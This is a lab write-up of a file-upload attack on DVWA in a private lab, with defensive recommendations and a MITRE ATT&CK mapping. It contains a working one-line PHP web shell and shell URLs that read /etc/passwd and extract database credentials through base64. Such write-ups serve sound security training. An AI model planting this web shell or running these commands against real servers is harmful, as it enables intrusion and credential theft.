# Lab Writeup #09 — File Upload: Web Shell & Remote Code Execution

**Date:** 01/04/2026  
**Target:** 192.168.56.102 (DVWA — Security: Low)  
**Attacker:** 192.168.56.101 (Kali Linux)  

## TL;DR
Exploited DVWA's unrestricted file upload to upload a PHP web shell. Used the shell to achieve remote code execution as `www-data`, enumerate the server, and exfiltrate database credentials from the application config file using base64 encoding to bypass browser rendering.

## What is a File Upload Vulnerability?
Web applications that accept file uploads must validate what is being uploaded. If validation is missing or bypassable, an attacker can upload a PHP file instead of an image. When the server hosts that file, visiting it in a browser causes the server to **execute** it rather than serve it as static content.

A web shell is a PHP file that passes URL parameters directly to system commands:
```php
<?php system($_GET["cmd"]); ?>
```
Visiting `shell.php?cmd=whoami` causes the server to run `whoami` and return the output. The attacker now has an interactive command interface running as the web server user.

## Attack Steps

### Step 1 — Create the Web Shell on Kali
```bash
┌──(kali㉿kali)-[~]
└─$ echo '<?php system($_GET["cmd"]); ?>' > ~/shell.php

┌──(kali㉿kali)-[~]
└─$ cat ~/shell.php
<?php system($_GET["cmd"]); ?>
```

### Step 2 — Upload via DVWA File Upload
Navigated to DVWA → File Upload, selected `shell.php` and submitted.

**Result:**
```
../../hackable/uploads/shell.php successfully uploaded!
```
No file type validation was performed — the server accepted a PHP file as if it were an image.

### Step 3 — Confirm Remote Code Execution
Visited the uploaded shell in the browser:
```
http://192.168.56.102/DVWA/hackable/uploads/shell.php?cmd=whoami
```

**Result:**
```
www-data
```
Code execution confirmed. Commands run as `www-data` — the Apache web server user.

### Step 4 — Enumerate the Server

**OS and kernel version:**
```
http://192.168.56.102/DVWA/hackable/uploads/shell.php?cmd=uname+-a

Linux Ubuntu-Target 6.14.0-29-generic #29~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC
Thu Aug 14 16:52:50 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

**Real users on the system (from /etc/passwd):**
```
http://192.168.56.102/DVWA/hackable/uploads/shell.php?cmd=cat+/etc/passwd

root:x:0:0:root:/root:/bin/bash
vboxuser:x:1000:1000:vboxuser:/home/vboxuser:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:125:127:MariaDB Server,,,:/nonexistent:/bin/false
```
Key finding: `vboxuser` (UID 1000) is the only interactive human user. `www-data` has no login shell — privilege escalation to `vboxuser` or `root` would be the next step in a real engagement.

**Confirm RCE in process list:**
```
http://192.168.56.102/DVWA/hackable/uploads/shell.php?cmd=ps+aux

www-data 4562  0.0  0.0  2800  1568 ?  S  15:03  0:00  sh -c -- ps aux
www-data 4563  100  0.1  7892  4064 ?  R  15:03  0:00  ps aux
```
The attacker's own commands are visible in the process list — proof of live execution on the target.

### Step 5 — Locate Config Files
```
http://192.168.56.102/DVWA/hackable/uploads/shell.php?cmd=find+/var/www/html/DVWA/config+-type+f

/var/www/html/DVWA/config/config.inc.php
/var/www/html/DVWA/config/config.inc.php.bak
/var/www/html/DVWA/config/config.inc.php.dist
```

**Check file permissions:**
```
http://192.168.56.102/DVWA/hackable/uploads/shell.php?cmd=ls+-la+/var/www/html/DVWA/config/

-rw-r--r-- 1 root     root     2437 Mar 18 20:23 config.inc.php
-rw-r--r-- 1 www-data www-data 2437 Apr  1 22:05 config.inc.php.bak
-rw-r--r-- 1 www-data www-data 2437 Mar 18 20:22 config.inc.php.dist
```

### Step 6 — Exfiltrate Credentials via Base64
Direct `cat` returned a blank page because the browser rendered the PHP tags as HTML. Encoded the file contents as base64 to bypass this:

```
http://192.168.56.102/DVWA/hackable/uploads/shell.php?cmd=cat+/var/www/html/DVWA/config/config.inc.php.bak+|+base64
```

**Returned base64 blob decoded on Kali:**
```bash
┌──(kali㉿kali)-[~]
└─$ echo "PD9waHAKCiMgSWYgeW91IGFyZSBoYXZpbmcgcHJvYmxlbXMgY29ubmVj..." | base64 -d

<?php
# Database management system to use
$DBMS = getenv('DBMS') ?: 'MySQL';
$_DVWA[ 'db_server' ]   = getenv('DB_SERVER') ?: '127.0.0.1';
$_DVWA[ 'db_database' ] = getenv('DB_DATABASE') ?: 'dvwa';
$_DVWA[ 'db_user' ]     = getenv('DB_USER') ?: 'dvwa';
$_DVWA[ 'db_password' ] = getenv('DB_PASSWORD') ?: 'p@ssw0rd';
$_DVWA[ 'db_port']      = getenv('DB_PORT') ?: '3306';
```

**Database credentials extracted:**

| Field | Value |
|-------|-------|
| Host | 127.0.0.1 |
| Database | dvwa |
| Username | dvwa |
| Password | p@ssw0rd |
| Port | 3306 |

## Key Findings
- No file type validation — server accepted PHP disguised as any file
- RCE achieved immediately on upload with a 30-byte payload
- Web server runs as `www-data` — lower privilege but sufficient to read config files
- Database credentials stored in plaintext in a world-readable config file
- Base64 encoding bypassed browser rendering to exfiltrate file contents
- MariaDB running on port 3306 — credentials could be used to connect directly to the database

## Why Base64 Exfiltration Works
The browser sees `<?php` tags and silently discards them as unrecognised HTML. Encoding the file as base64 converts it to a plain alphanumeric string with no special characters — the browser renders it as text, and the attacker decodes it locally.

## Defensive Recommendations
| Fix | Implementation |
|-----|---------------|
| Validate file type server-side | Check MIME type and magic bytes, not just extension |
| Restrict upload directory | Set the uploads folder to non-executable (`php_flag engine off`) |
| Store uploads outside webroot | Files in `/var/uploads/` can't be accessed via HTTP |
| Use environment variables for credentials | Never store credentials in files inside webroot |
| Run Apache as restricted user | `www-data` should have minimal filesystem read permissions |

## MITRE ATT&CK
| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | System Information Discovery | T1082 |
| Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credentials in Files | T1552.001 |

## Next Steps
- Use extracted credentials to connect to MariaDB directly via the web shell
- Attempt privilege escalation from `www-data` to `vboxuser` or `root`
- Try the same attack with DVWA security set to Medium — observe how the filter can be bypassed